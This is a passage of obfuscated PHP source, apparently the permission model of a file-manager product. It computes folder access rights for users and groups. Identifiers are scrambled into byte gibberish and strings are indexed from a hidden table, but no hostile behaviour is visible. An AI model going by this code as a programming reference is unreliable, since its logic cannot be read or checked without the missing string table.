Model($¶åíÚ¿Â[1250])->field($¶åíÚ¿Â[412])->where($‘”Õ³û½­µæ)->getField($¶åíÚ¿Â[397], !0); $º¿Æ˜ç®Ù[] = $Çáš’ÃÚ¸Ó Û; } $this->where(array($¶åíÚ¿Â[412] => array($¶åíÚ¿Â[413], $º¿Æ˜ç®Ù)))->delete(); return !0; } public function getAllChildren($µì¬) { $ËŞ¿—éŒ =& $_SERVER[ÀÆ]; $£¤ÃÃ°‘ŞŸØ = Model($ËŞ¿—éŒ[1250])->sourceInfo($µì¬); if ($£¤ÃÃ°‘ŞŸØ[$ËŞ¿—éŒ[405]] != $ËŞ¿—éŒ[87]) { return $this->sourceListAuth(array($µì¬)); } if ($£¤ÃÃ°‘ŞŸØ[$ËŞ¿—éŒ[406]] != SourceModel::TYPE_GROUP) { return array(); } $Ò•ç˜öÆë = 1; $Š´¦ŞÂô» = array($µì¬); if ($£¤ÃÃ°‘ŞŸØ[$ËŞ¿—éŒ[492]] == $ËŞ¿—éŒ[191] && $£¤ÃÃ°‘ŞŸØ[$ËŞ¿—éŒ[498]] != $Ò•ç˜öÆë) { $Š´¦ŞÂô» = $this->groupChidldAllRootSource($£¤ÃÃ°‘ŞŸØ[$ËŞ¿—éŒ[498]]); } $½ÚŠ¾üÇÚ‹°¯ = $this->field($ËŞ¿—éŒ[397])->group($ËŞ¿—éŒ[397])->select(); $½ÚŠ¾üÇÚ‹°¯ = array_to_keyvalue($½ÚŠ¾üÇÚ‹°¯, $ËŞ¿—éŒ[33], $ËŞ¿—éŒ[397]); if (!$½ÚŠ¾üÇÚ‹°¯) { return array(); } $œÏ¸ü“¢ÖÍ™Â = $ËŞ¿—éŒ[1915]; $øìÍ² = array($ËŞ¿—éŒ[397] => array($ËŞ¿—éŒ[7], $½ÚŠ¾üÇÚ‹°¯), $ËŞ¿—éŒ[425] => $ËŞ¿—éŒ[191]); $Ö¯¹¾Ğ = Model($ËŞ¿—éŒ[817])->field($œÏ¸ü“¢ÖÍ™Â)->where($øìÍ²)->select(); $»‘ï = array($µì¬); foreach ($Ö¯¹¾Ğ as $Œ¶›òå‰) { foreach ($Š´¦ŞÂô» as $ŸÙ¼Ğ‘ø³¤Â”) { $â–¸ß¥•× = $ËŞ¿—éŒ[47] . $ŸÙ¼Ğ‘ø³¤Â” . $ËŞ¿—éŒ[47]; $áÒ†µ = $Œ¶›òå‰[$ËŞ¿—éŒ[515]] . $Œ¶›òå‰[$ËŞ¿—éŒ[397]] . $ËŞ¿—éŒ[47]; if (strstr($áÒ†µ, $â–¸ß¥•×)) { $»‘ï[] = $Œ¶›òå‰[$ËŞ¿—éŒ[397]]; break; } } } return $this->sourceListAuth($»‘ï); } private function sourceListAuth($ë©˜Šèù) { $ÕÇ =& $_SERVER[ÀÆ]; $¦“¿â˜ßÉ• = Model($ÕÇ[1250])->sourceListInfo($ë©˜Šèù, !0); $š¢’ = $this->sourceAuthSelect($ë©˜Šèù); $«º¶ãÄõ“”ëà = array(); $ïİâºæ¤ë = array(); foreach ($¦“¿â˜ßÉ• as $æë’å²Ô¹À‰) { unset($æë’å²Ô¹À‰[$ÕÇ[448]]); unset($æë’å²Ô¹À‰[$ÕÇ[446]]); unset($æë’å²Ô¹À‰[$ÕÇ[408]]); unset($æë’å²Ô¹À‰[$ÕÇ[85]]); $ÕÉÎ³÷—ì‡í = $š¢’[$æë’å²Ô¹À‰[$ÕÇ[397]]]; if (!$ÕÉÎ³÷—ì‡í) { continue; } $æë’å²Ô¹À‰[$ÕÇ[1916]] = $this->authTargetInfo($ÕÉÎ³÷—ì‡í); $æë’å²Ô¹À‰[$ÕÇ[513]] = rtrim($æë’å²Ô¹À‰[$ÕÇ[519]], $ÕÇ[8]) . $ÕÇ[8] . ltrim($æë’å²Ô¹À‰[$ÕÇ[513]], $ÕÇ[8]); $«º¶ãÄõ“”ëà[] = $æë’å²Ô¹À‰; $íÜ¤˜ = count(explode($ÕÇ[8], trim($æë’å²Ô¹À‰[$ÕÇ[513]], $ÕÇ[8]))); $ïİâºæ¤ë[] = $íÜ¤˜ + ($æë’å²Ô¹À‰[$ÕÇ[29]] == $ÕÇ[77] ? 0 : 1000); } array_multisort($ïİâºæ¤ë, SORT_ASC, $«º¶ãÄõ“”ëà); return $«º¶ãÄõ“”ëà; } private function groupChidldAllRootSource($…Ë) { $„ñ¨„Ï˜ =& $_SERVER[ÀÆ]; $°¿îÃŞ = Model($„ñ¨„Ï˜[1917])->groupChildrenAll($…Ë); $°Œ“ÉÔ®ÑÅ = array($„ñ¨„Ï˜[492] => 0, $„ñ¨„Ï˜[498] => array($„ñ¨„Ï˜[7], $°¿îÃŞ), $„ñ¨„Ï˜[406] => SourceModel::TYPE_GROUP); $éîÙ‰øı = Model($„ñ¨„Ï˜[817])->field($„ñ¨„Ï˜[397])->where($°Œ“ÉÔ®ÑÅ)->select(); $éîÙ‰øı = array_to_keyvalue($éîÙ‰øı, $„ñ¨„Ï˜[33], $„ñ¨„Ï˜[397]); return $éîÙ‰øı; } private function authTargetInfo($•¶¨à€ˆ©) { $–È´¼š =& $_SERVER[ÀÆ]; $‹Ğâ•“ç = array(); $îÂÑá—úËİğè = array(); $„ŒÉ‚ú‰ = 2 << 25; foreach ($•¶¨à€ˆ© as $æäÆ£ç) { $À€”ĞÇ÷ = Model($–È´¼š[501])->listData($æäÆ£ç[$–È´¼š[1842]]); if (!$À€”ĞÇ÷) { continue; } if ($æäÆ£ç[$–È´¼š[406]] == SourceModel::TYPE_USER) { $ø× = Model($–È´¼š[507])->getInfoSimpleOuter($æäÆ£ç[$–È´¼š[498]]); if ($ø×[$–È´¼š[1572]] == $–È´¼š[1117]) { continue; } if ($ø×[$–È´¼š[1572]] == $–È´¼š[191]) { $ø×[$–È´¼š[28]] = LNG($–È´¼š[1918]); } } else { $ø× = Model($–È´¼š[516])->getInfoSimple($æäÆ£ç[$–È´¼š[498]]); } if (!$ø×) { continue; } $ø×[$–È´¼š[460]] = $À€”ĞÇ÷; $‹Ğâ•“ç[] = $ø×; $ÚÚö© = 0; if ($æäÆ£ç[$–È´¼š[406]] == SourceModel::TYPE_GROUP) { $ÚÚö© = $„ŒÉ‚ú‰ * 2; } if ($æäÆ£ç[$–È´¼š[406]] == SourceModel::TYPE_USER) { $ÚÚö© = $„ŒÉ‚ú‰; } if ($æäÆ£ç[$–È´¼š[406]] == SourceModel::TYPE_USER && $æäÆ£ç[$–È´¼š[498]] == $–È´¼š[191]) { $ÚÚö© = 0; } $îÂÑá—úËİğè[] = $À€”ĞÇ÷[$–È´¼š[408]] + $ÚÚö©; } array_multisort($îÂÑá—úËİğè, SORT_DESC, $‹Ğâ•“ç); return $‹Ğâ•“ç; } public function getAllChildrenByUser($¯Å¨, $èºšİæ–±) { $€³Îº£‚ =& $_SERVER[ÀÆ]; $Ì‡‡·ù = Model($€³Îº£‚[532])->getInfo($èºšİæ–±); if (!$èºšİæ–± || !$¯Å¨ || !$Ì‡‡·ù) { return array(); } $äò·ú¾‹ÏŠ– = Model($€³Îº£‚[1250])->sourceInfo($¯Å¨); $†ì¹Œ³­Â = array(); $Õ»ƒÕ–ëä¯ = 1; if ($äò·ú¾‹ÏŠ–[$€³Îº£‚[492]] == $€³Îº£‚[191] && $äò·ú¾‹ÏŠ–[$€³Îº£‚[498]] != $Õ»ƒÕ–ëä¯ && $this->groupContainUser($äò·ú¾‹ÏŠ–[$€³Îº£‚[498]], $èºšİæ–±)) { foreach ($Ì‡‡·ù[$€³Îº£‚[1919]] as $öİ…ïØ®¼) { $ãÓ = Model($€³Îº£‚[516])->getInfo($öİ…ïØ®¼[$€³Îº£‚[1739]]); $âÈ§ª = Model($€³Îº£‚[532])->getInfoSimpleOuter($èºšİæ–±); $âÈ§ª[$€³Îº£‚[460]] = $öİ…ïØ®¼[$€³Îº£‚[408]]; if (Model($€³Îº£‚[501])->authCheckAction($öİ…ïØ®¼[$€³Îº£‚[408]][$€³Îº£‚[408]], $€³Îº£‚[1759])) { continue; } $Ùçô» = array($€³Îº£‚[28] => $€³Îº£‚[1524] . $ãÓ[$€³Îº£‚[28]], $€³Îº£‚[397] => $ãÓ[$€³Îº£‚[85]][$€³Îº£‚[397]], $€³Îº£‚[76] => KodIO::make($ãÓ[$€³Îº£‚[85]][$€³Îº£‚[397]]), $€³Îº£‚[492] => $€³Îº£‚[191], $€³Îº£‚[406] => $€³Îº£‚[509], $€³Îº£‚[29] => $€³Îº£‚[542], $€³Îº£‚[513] => $ãÓ[$€³Îº£‚[520]], $€³Îº£‚[1739] => $ãÓ[$€³Îº£‚[1739]], $€³Îº£‚[517] => $ãÓ[$€³Îº£‚[492]], $€³Îº£‚[1916] => array($âÈ§ª)); $†ì¹Œ³­Â[$Ùçô»[$€³Îº£‚[397]]] = $Ùçô»; } } $Š¹³çæ = array(); $‘£“ = $this->getAllChildren($¯Å¨); foreach ($‘£“ as $š„ªÇ—) { $Ü×¤ˆ‘¶Å¯ = !1; foreach ($š„ªÇ—[$€³Îº£‚[1916]] as $³) { if ($³[$€³Îº£‚[1572]]) { if ($³[$€³Îº£‚[1572]] == $èºšİæ–±) { $Ü×¤ˆ‘¶Å¯ = !0; break; } } if ($³[$€³Îº£‚[1739]]) { if ($this->groupContainUser($³[$€³Îº£‚[1739]], $èºšİæ–±)) { $Ü×¤ˆ‘¶Å¯ = !0; break; } } } if ($Ü×¤ˆ‘¶Å¯) { $Š¹³çæ[] = $š„ªÇ—; } $‚†ó÷ = $š„ªÇ—[$€³Îº£‚[397]]; if (isset($†ì¹Œ³­Â[$‚†ó÷])) { $š„ªÇ—[$€³Îº£‚[1916]][] = $†ì¹Œ³­Â[$‚†ó÷][0]; $†ì¹Œ³­Â[$‚†ó÷] = !1; } } $†ì¹Œ³­Â = array_filter(array_values($†ì¹Œ³­Â)); $Š¹³çæ = array_merge($†ì¹Œ³­Â, $Š¹³çæ); return $Š¹³çæ; } public function setAllChildrenByUser($¨ÑªáÙ, $Î˜÷Ç–, $ÊíØÏ) { $¼‰Øò¬¿·ç =& $_SERVER[ÀÆ]; $ø—ìö­ = $this->getAllChildrenByUser($¨ÑªáÙ, $Î˜÷Ç–); if (!$ÊíØÏ || !$ø—ìö­) { return !1; } foreach ($ø—ìö­ as $áïû§áµ¸) { $Ûû = array(); foreach ($áïû§áµ¸[$¼‰Øò¬¿·ç[1916]] as $­û¥) { $ª¹“ƒ‰¿’÷ = $­û¥[$¼‰Øò¬¿·ç[460]]; $ôÜ¹ê™¶˜Š»ô = $­û¥[$¼‰Øò¬¿·ç[1572]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $«ØùøÚáìÃ = $­û¥[$¼‰Øò¬¿·ç[1572]] ? $­û¥[$¼‰Øò¬¿·ç[1572]] : $­û¥[$¼‰Øò¬¿·ç[1739]]; if ($­û¥[$¼‰Øò¬¿·ç[1572]] && $­û¥[$¼‰Øò¬¿·ç[1572]] == $Î˜÷Ç–) { continue; } $Ûû[] = array($¼‰Øò¬¿·ç[397] => $áïû§áµ¸[$¼‰Øò¬¿·ç[397]], $¼‰Øò¬¿·ç[406] => $ôÜ¹ê™¶˜Š»ô, $¼‰Øò¬¿·ç[498] => intval($«ØùøÚáìÃ), $¼‰Øò¬¿·ç[1842] => isset($ª¹“ƒ‰¿’÷[$¼‰Øò¬¿·ç[395]]) ? intval($ª¹“ƒ‰¿’÷[$¼‰Øò¬¿·ç[395]]) : 0, $¼‰Øò¬¿·ç[1896] => isset($ª¹“ƒ‰¿’÷[$¼‰Øò¬¿·ç[1896]]) ? intval($ª¹“ƒ‰¿’÷[$¼‰Øò¬¿·ç[1896]]) : -1); } $Ûû[] = array($¼‰Øò¬¿·ç[397] => $áïû§áµ¸[$¼‰Øò¬¿·ç[397]], $¼‰Øò¬¿·ç[406] => SourceModel::TYPE_USER, $¼‰Øò¬¿·ç[498] => intval($Î˜÷Ç–), $¼‰Øò¬¿·ç[1842] => intval($ÊíØÏ), $¼‰Øò¬¿·ç[1896] => -1); $this->where(array($¼‰Øò¬¿·ç[412] => $áïû§áµ¸[$¼‰Øò¬¿·ç[397]]))->delete(); $this->addAll($Ûû); } return !0; } public function get($†ş—ØÓüÔú) { $„ˆ¯Š¦ = $this->getSourceList(array($†ş—ØÓüÔú), !0); return $„ˆ¯Š¦[0]; } public function getSourceList($İ¦, $ô = false, $Ûí™àññë = false) { $»² =& $_SERVER[ÀÆ]; if (!$İ¦) { return array(); } $¥Ù§” = Model($»²[1250]); if (!$ô && count($İ¦) == 1) { $ô = array(); $ô[$İ¦[0]] = $¥Ù§”->sourceInfo($İ¦[0]); } if (!$ô) { $Ñ¶¸ˆÖ = array($»²[412] => array($»²[413], $İ¦)); $ô = $¥Ù§”->field($»²[1920])->where($Ñ¶¸ˆÖ)->select(); $ô = array_to_keyvalue($ô, $»²[397]); } $êÁı–¹­Ï™ºı = $İ¦; foreach ($ô as $¹¿Ñ => $Î¦»Ô) { $áëş§–¶Õ = $¥Ù§”->parentLevelArray($Î¦»Ô[$»²[515]]); $êÁı–¹­Ï™ºı = array_merge($êÁı–¹­Ï™ºı, array($¹¿Ñ), array_reverse($áëş§–¶Õ)); } $êÁı–¹­Ï™ºı = array_values(array_unique($êÁı–¹­Ï™ºı)); if (!$êÁı–¹­Ï™ºı) { return array(); } $ÍÌ­Ã©£ñ¥Ì = $this->sourceAuthSelect($êÁı–¹­Ï™ºı); $Í = array(); foreach ($êÁı–¹­Ï™ºı as $‘²ÏêØ) { if (isset($ÍÌ­Ã©£ñ¥Ì[$‘²ÏêØ])) { $Í[$‘²ÏêØ] = $ÍÌ­Ã©£ñ¥Ì[$‘²ÏêØ]; } } $¡±í˜º»· = $this->userIsRoot($Ûí™àññë); $èø‚ËŸÀ³ = AuthModel::authAll(); $Ñèû´¿Ë¹¥ = array($»²[409] => $èø‚ËŸÀ³, $»²[1921] => array($»²[414] => 0, $»²[1745] => $èø‚ËŸÀ³, $»²[415] => LNG($»²[1922]), $»²[1761] => $»²[1923])); $¹¯ÆÍ° = array(); foreach ($ô as $‘²ÏêØ => $ß°) { if ($¡±í˜º»·) { $¹¯ÆÍ°[$‘²ÏêØ] = $Ñèû´¿Ë¹¥; continue; } $¹¯ÆÍ°[$‘²ÏêØ] = $this->makeSourceAuth($ß°, $Í, $Ûí™àññë); } return $¹¯ÆÍ°; } public function authDeepCheck($¨ƒÚ, $àáô¾Ü«¤ = false) { $ã‰‚ÄÉÏÉ =& $_SERVER[ÀÆ]; $àáô¾Ü«¤ = $àáô¾Ü«¤ ? $àáô¾Ü«¤ : USER_ID; $¼Ã‰ = $this->makeAuthDeep($àáô¾Ü«¤); if (!in_array($¨ƒÚ, $¼Ã‰[$ã‰‚ÄÉÏÉ[1924]])) { return !1; } $şúî×¨Şñ•¤¯ = array(); foreach ($¼Ã‰[$ã‰‚ÄÉÏÉ[1925]] as $—ºÍ½Ëºûº => $±Úì§Ï) { if (!in_array($¨ƒÚ, $±Úì§Ï)) { continue; } $şúî×¨Şñ•¤¯[] = $—ºÍ½Ëºûº; } if (!$şúî×¨Şñ•¤¯) { return !1; } $»Ç¶ = $şúî×¨Şñ•¤¯ ? $şúî×¨Şñ•¤¯[0] : $¨ƒÚ; return array($ã‰‚ÄÉÏÉ[409] => -1, $ã‰‚ÄÉÏÉ[460] => array($ã‰‚ÄÉÏÉ[414] => $ã‰‚ÄÉÏÉ[1117], $ã‰‚ÄÉÏÉ[1745] => $ã‰‚ÄÉÏÉ[191], $ã‰‚ÄÉÏÉ[415] => LNG($ã‰‚ÄÉÏÉ[1926]), $ã‰‚ÄÉÏÉ[1761] => $ã‰‚ÄÉÏÉ[1927]), $ã‰‚ÄÉÏÉ[1928] => LNG($ã‰‚ÄÉÏÉ[1929]), $ã‰‚ÄÉÏÉ[1930] => $this->sourceAuthInfo($»Ç¶)); } protected function makeAuthDeep($Ò£‰ = false) { $’¶ÛôÑâı© =& $_SERVER[ÀÆ]; static $Ì€×‘ƒæÄ“ëØ = array(); $Ò£‰ = $Ò£‰ ? $Ò£‰ : USER_ID; if (isset($Ì€×‘ƒæÄ“ëØ[$Ò£‰])) { return $Ì€×‘ƒæÄ“ëØ[$Ò£‰]; } $æËšê÷ = Model($’¶ÛôÑâı©[1931])->listData(); $¤‰éõ€·ô = array(); foreach ($æËšê÷ as $–á‘ñëääúÑ) { if ($–á‘ñëääúÑ[$’¶ÛôÑâı©[408]] == 0 && $–á‘ñëääúÑ[$’¶ÛôÑâı©[1760]] == $’¶ÛôÑâı©[87]) { $¤‰éõ€·ô[] = $–á‘ñëääúÑ[$’¶ÛôÑâı©[395]]; } } $ğ½ = $this->userGroupParents($Ò£‰); $÷ = array($’¶ÛôÑâı©[406] => SourceModel::TYPE_USER, $’¶ÛôÑâı©[498] => $Ò£‰); if ($ğ½) { $÷ = array(array($’¶ÛôÑâı©[406] => SourceModel::TYPE_USER, $’¶ÛôÑâı©[498] => $Ò£‰), array($’¶ÛôÑâı©[406] => SourceModel::TYPE_GROUP, $’¶ÛôÑâı©[498] => array($’¶ÛôÑâı©[413], $ğ½)), $’¶ÛôÑâı©[991] => $’¶ÛôÑâı©[1834]); } $û = $this->field($’¶ÛôÑâı©[1932])->where($÷)->select(); $íÛ = array(); $…±›·ŞÎÁ = array_to_keyvalue_group($û, $’¶ÛôÑâı©[397]); foreach ($…±›·ŞÎÁ as $ÖàëªòİÚ => $Ë±ù¨ ™Ü) { $ÎöûîÃ = $this->authArrayCheck($Ë±ù¨ ™Ü, $Ò£‰); if ($ÎöûîÃ[$’¶ÛôÑâı©[409]] > 0) { $íÛ[] = $ÖàëªòİÚ . $’¶ÛôÑâı©[33]; } } $á†úŠ = array(); $¡ßĞ¡ = $ğ½; $î´Ï±àâ¸ê = Model($’¶ÛôÑâı©[1250]); $Ë©ÎÁ®Ã = Model($’¶ÛôÑâı©[516]); $¸Ò»©Ê•ß = array(); $ëæ½­´Ğ›¦Ë = array(); $è³ş“«» = array(); $Úù¥Š§ø¬ØØ = array(); if ($íÛ) { $“Ï·ş = $î´Ï±àâ¸ê->where(array($’¶ÛôÑâı©[397] => array($’¶ÛôÑâı©[413], $íÛ)))->select(); foreach ($“Ï·ş as $×²’Ãùü’¾Å) { $ŞÑÔ‚¯‚ğÆ = $î´Ï±àâ¸ê->parentLevelArray($×²’Ãùü’¾Å[$’¶ÛôÑâı©[515]]); $á†úŠ = array_merge($á†úŠ, $ŞÑÔ‚¯‚ğÆ); $¡ßĞ¡[] = $×²’Ãùü’¾Å[$’¶ÛôÑâı©[498]]; $¸Ò»©Ê•ß[$×²’Ãùü’¾Å[$’¶ÛôÑâı©[397]]] = $ŞÑÔ‚¯‚ğÆ; $ëæ½­´Ğ›¦Ë[$×²’Ãùü’¾Å[$’¶ÛôÑâı©[397]]] = $×²’Ãùü’¾Å[$’¶ÛôÑâı©[498]]; } } $¡ßĞ¡ = array_values(array_unique($¡ßĞ¡)); $ˆÃÒÄ¾Ê = $¡ßĞ¡; foreach ($ˆÃÒÄ¾Ê as $ÆêÍØœ) { $×â¦£€ = $Ë©ÎÁ®Ã->getInfo($ÆêÍØœ); $ŞÑÔ‚¯‚ğÆ = $î´Ï±àâ¸ê->parentLevelArray($×â¦£€[$’¶ÛôÑâı©[515]]); $¡ßĞ¡ = array_merge($¡ßĞ¡, $ŞÑÔ‚¯‚ğÆ); } $¡ßĞ¡ = array_values(array_unique($¡ßĞ¡)); foreach ($¡ßĞ¡ as $ÆêÍØœ) { $×â¦£€ = $Ë©ÎÁ®Ã->getInfo($ÆêÍØœ); $á†úŠ[] = $×â¦£€[$’¶ÛôÑâı©[85]][$’¶ÛôÑâı©[397]]; $è³ş“«»[$ÆêÍØœ] = $×â¦£€[$’¶ÛôÑâı©[85]][$’¶ÛôÑâı©[397]]; $Úù¥Š§ø¬ØØ[$ÆêÍØœ] = $î´Ï±àâ¸ê->parentLevelArray($×â¦£€[$’¶ÛôÑâı©[515]]); } foreach ($¸Ò»©Ê•ß as $ãÊõÅÓà => $²ÈõÁ›Í) { $Ç¾ÖØ™ùÀ = $ëæ½­´Ğ›¦Ë[$ãÊõÅÓà]; if (!$Ç¾ÖØ™ùÀ || !$è³ş“«»[$Ç¾ÖØ™ùÀ]) { continue; } $Áèôù = array(); foreach ($Úù¥Š§ø¬ØØ[$Ç¾ÖØ™ùÀ] as $ÆêÍØœ) { $Áèôù[] = $è³ş“«»[$ÆêÍØœ]; } $¸Ò»©Ê•ß[$ãÊõÅÓà] = array_merge($Áèôù, $²ÈõÁ›Í); } $á†úŠ = array_values(array_unique($á†úŠ)); $˜ÇİÃ‚©çÁ¤ = array($’¶ÛôÑâı©[1924] => $á†úŠ, $’¶ÛôÑâı©[1925] => $¸Ò»©Ê•ß); $Ì€×‘ƒæÄ“ëØ[$Ò£‰] = $˜ÇİÃ‚©çÁ¤; return $˜ÇİÃ‚©çÁ¤; } private function makeSourceAuth($‰½ÛªŒá»«±, $ß¨Ü, $÷Ñô‰¬²Šü = false) { $ÀºŞºÄìŠ =& $_SERVER[ÀÆ]; $×‘ÅÚ = $ÀºŞºÄìŠ[87]; $ÓñŒ‡ëï‚š = $‰½ÛªŒá»«±[$ÀºŞºÄìŠ[498]]; $’úå·ŒÒ = $‰½ÛªŒá»«±[$ÀºŞºÄìŠ[406]] == SourceModel::TYPE_GROUP; $ûáŸİü = $’úå·ŒÒ ? $this->groupRootAuth($ÓñŒ‡ëï‚š, $÷Ñô‰¬²Šü) : !1; if ($ûáŸİü && Model($ÀºŞºÄìŠ[501])->authCheckAction($ûáŸİü[$ÀºŞºÄìŠ[408]], $ÀºŞºÄìŠ[1759])) { return $this->groupAuthInfo($ûáŸİü, $ÓñŒ‡ëï‚š); } $×ïÃ¬ñ = Model($ÀºŞºÄìŠ[1250])->parentLevelArray($‰½ÛªŒá»«±[$ÀºŞºÄìŠ[515]]); $×ïÃ¬ñ = array_merge(array($‰½ÛªŒá»«±[$ÀºŞºÄìŠ[397]]), array_reverse($×ïÃ¬ñ)); $µµÕË£¢ = !1; foreach ($×ïÃ¬ñ as $›æÏ²¨Ø) { if (!isset($ß¨Ü[$›æÏ²¨Ø])) { continue; } $…ß = $this->authMake($ß¨Ü[$›æÏ²¨Ø], $÷Ñô‰¬²Šü); if ($…ß[$ÀºŞºÄìŠ[460]]) { $µµÕË£¢ = $…ß; break; } } if (!$’úå·ŒÒ) { return $µµÕË£¢; } if (!$µµÕË£¢ && $ûáŸİü) { $µµÕË£¢ = $this->groupAuthInfo($ûáŸİü, $ÓñŒ‡ëï‚š); } if (!$µµÕË£¢) { $ŞÆıá¶áÛ = Model($ÀºŞºÄìŠ[516])->getInfo($ÓñŒ‡ëï‚š); $±×šıÈúˆ‚¢ = explode($ÀºŞºÄìŠ[47], trim($ŞÆıá¶áÛ[$ÀºŞºÄìŠ[515]], $ÀºŞºÄìŠ[47])); $±×šıÈúˆ‚¢ = array_reverse($±×šıÈúˆ‚¢); foreach ($±×šıÈúˆ‚¢ as $ãÆ) { if ($ãÆ == $ÀºŞºÄìŠ[191] || $ãÆ == $×‘ÅÚ) { continue; } $ØŠÊù£©ãÔ• = $this->groupRootAuth($ãÆ, $÷Ñô‰¬²Šü); if (!$ØŠÊù£©ãÔ•) { continue; } $µµÕË£¢ = $this->groupAuthInfo($ØŠÊù£©ãÔ•, $ãÆ); break; } } if (!$µµÕË£¢ || $µµÕË£¢[$ÀºŞºÄìŠ[409]] <= 0) { $ƒ¢…ñ = $this->authDeepCheck($‰½ÛªŒá»«±[$ÀºŞºÄìŠ[397]], $÷Ñô‰¬²Šü); if ($ƒ¢…ñ) { $µµÕË£¢ = $ƒ¢…ñ; } } return $µµÕË£¢; } private function userIsRoot($ŠÄÊÜ = false) { $ÌŞ‡‹×ÅŒÌú³ =& $_SERVER[ÀÆ]; if (!$ŠÄÊÜ && _get($GLOBALS, $ÌŞ‡‹×ÅŒÌú³[499])) { return !0; } $•èœñòÏ = Model($ÌŞ‡‹×ÅŒÌú³[532])->getInfo($ŠÄÊÜ); $†¥§° = Model($ÌŞ‡‹×ÅŒÌú³[1933])->listData($•èœñòÏ[$ÌŞ‡‹×ÅŒÌú³[1454]]); if ($†¥§° && $†¥§°[$ÌŞ‡‹×ÅŒÌú³[505]][$ÌŞ‡‹×ÅŒÌú³[1934]] == 1) { return !0; } return !1; } private function sourceAuthInfo($á¾ÑÏü²¸ˆ’¥) { $‚ûÕ‚Ôª‚Í¦ =& $_SERVER[ÀÆ]; $¯€ûµ = Model($‚ûÕ‚Ôª‚Í¦[1250]); $ºÑ¶°ÂŞÀ = $¯€ûµ->sourceInfo($á¾ÑÏü²¸ˆ’¥); if (!$ºÑ¶°ÂŞÀ) { return !1; } $¯€ûµ->groupPathDisplay($ºÑ¶°ÂŞÀ); $Î¥Á¸É÷ä™¹† = array($ºÑ¶°ÂŞÀ); $Î¥Á¸É÷ä™¹† = $¯€ûµ->_listAppendPath($Î¥Á¸É÷ä™¹†); $ºÑ¶°ÂŞÀ = $Î¥Á¸É÷ä™¹†[0]; $â± = $ºÑ¶°ÂŞÀ[$‚ûÕ‚Ôª‚Í¦[513]]; if (isset($ºÑ¶°ÂŞÀ[$‚ûÕ‚Ôª‚Í¦[521]])) { $ğ¿¡ôü“Èä‹ = explode($‚ûÕ‚Ôª‚Í¦[8], trim($ºÑ¶°ÂŞÀ[$‚ûÕ‚Ôª‚Í¦[513]], $‚ûÕ‚Ôª‚Í¦[8])); array_shift($ğ¿¡ôü“Èä‹); $â± = $ºÑ¶°ÂŞÀ[$‚ûÕ‚Ôª‚Í¦[519]] . $‚ûÕ‚Ôª‚Í¦[1935] . implode($‚ûÕ‚Ôª‚Í¦[8], $ğ¿¡ôü“Èä‹); } return array($‚ûÕ‚Ôª‚Í¦[415] => $ºÑ¶°ÂŞÀ[$‚ûÕ‚Ôª‚Í¦[28]], $‚ûÕ‚Ôª‚Í¦[76] => KodIO::make($ºÑ¶°ÂŞÀ[$‚ûÕ‚Ôª‚Í¦[397]]), $‚ûÕ‚Ôª‚Í¦[1936] => $â±); } private function groupAuthInfo($Ïçåö, $­øª) { $¤Õ–ĞÎ¹øÍµ‹ =& $_SERVER[ÀÆ]; $Î¼„İòò€ş = Model($¤Õ–ĞÎ¹øÍµ‹[516])->getInfo($­øª); return array($¤Õ–ĞÎ¹øÍµ‹[1937] => intval($Ïçåö[$¤Õ–ĞÎ¹øÍµ‹[408]]), $¤Õ–ĞÎ¹øÍµ‹[1921] => $Ïçåö, $¤Õ–ĞÎ¹øÍµ‹[1938] => LNG($¤Õ–ĞÎ¹øÍµ‹[1939]), $¤Õ–ĞÎ¹øÍµ‹[1930] => array($¤Õ–ĞÎ¹øÍµ‹[415] => $Î¼„İòò€ş[$¤Õ–ĞÎ¹øÍµ‹[28]], $¤Õ–ĞÎ¹øÍµ‹[76] => KodIO::make($Î¼„İòò€ş[$¤Õ–ĞÎ¹øÍµ‹[85]][$¤Õ–ĞÎ¹øÍµ‹[397]]), $¤Õ–ĞÎ¹øÍµ‹[1936] => $Î¼„İòò€ş[$¤Õ–ĞÎ¹øÍµ‹[520]])); } protected function groupRootAuth($°Ë²èúƒì, $´·ÏÈ¨ = false) { $ÑŞ™ï… =& $_SERVER[ÀÆ]; $´·ÏÈ¨ = $´·ÏÈ¨ ? $´·ÏÈ¨ : USER_ID; $¸¯«Š—Ñ’ = $´·ÏÈ¨ . $ÑŞ™ï…[1940] . $°Ë²èúƒì; static $ï = array(); if (isset($ï[$¸¯«Š—Ñ’])) { return $ï[$¸¯«Š—Ñ’]; } $ãğ‚çˆ¡š = Model($ÑŞ™ï…[516])->getInfo($°Ë²èúƒì); $ÅÎ¨¨Ö”Ëê = $this->userGroupList($´·ÏÈ¨); $¹ı»‡÷ß÷ = isset($ÅÎ¨¨Ö”Ëê[$°Ë²èúƒì]) ? $ÅÎ¨¨Ö”Ëê[$°Ë²èúƒì][$ÑŞ™ï…[408]] : !1; if ($¹ı»‡÷ß÷ && Model($ÑŞ™ï…[501])->authCheckAction($¹ı»‡÷ß÷[$ÑŞ™ï…[408]], $ÑŞ™ï…[1759])) { $ï[$¸¯«Š—Ñ’] = $¹ı»‡÷ß÷; return $¹ı»‡÷ß÷; } $”ÇÆ€ = $this->sourceAuthSelect($ãğ‚çˆ¡š[$ÑŞ™ï…[85]][$ÑŞ™ï…[397]]); $¥»¶Õ˜‰ = $”ÇÆ€ ? $this->authMake($”ÇÆ€, $´·ÏÈ¨) : !1; $ìÓ = $¥»¶Õ˜‰ ? $¥»¶Õ˜‰[$ÑŞ™ï…[460]] : !1; $ï[$¸¯«Š—Ñ’] = $ìÓ ? $ìÓ : $¹ı»‡÷ß÷; return $ï[$¸¯«Š—Ñ’]; } public function authOwnerApply($Œ¬Ú¾) { $äÕ€æ£¶ =& $_SERVER[ÀÆ]; if (empty($Œ¬Ú¾[$äÕ€æ£¶[408]]) || isset($Œ¬Ú¾[$äÕ€æ£¶[1941]]) && $Œ¬Ú¾[$äÕ€æ£¶[1941]]) { return $Œ¬Ú¾; } if (AuthModel::authCheckRoot($Œ¬Ú¾[$äÕ€æ£¶[408]][$äÕ€æ£¶[409]])) { return $Œ¬Ú¾; } $Æµ¢ÖØ = Model($äÕ€æ£¶[1250])->parentLevelArray($Œ¬Ú¾[$äÕ€æ£¶[515]]); $Æµ¢ÖØ = array_merge(array($Œ¬Ú¾[$äÕ€æ£¶[397]]), array_reverse($Æµ¢ÖØ)); $üïŒİ„òŒ‘Ó = $this->sourceAuthSelect($Æµ¢ÖØ); $¶¹óÌ“Ò… = array(); $Æ¾»ªûé = array(); foreach ($üïŒİ„òŒ‘Ó as $°œ¤— => $ÏÖëíÓ‚§‡§) { $î´•²¶Ì½¸¡ = 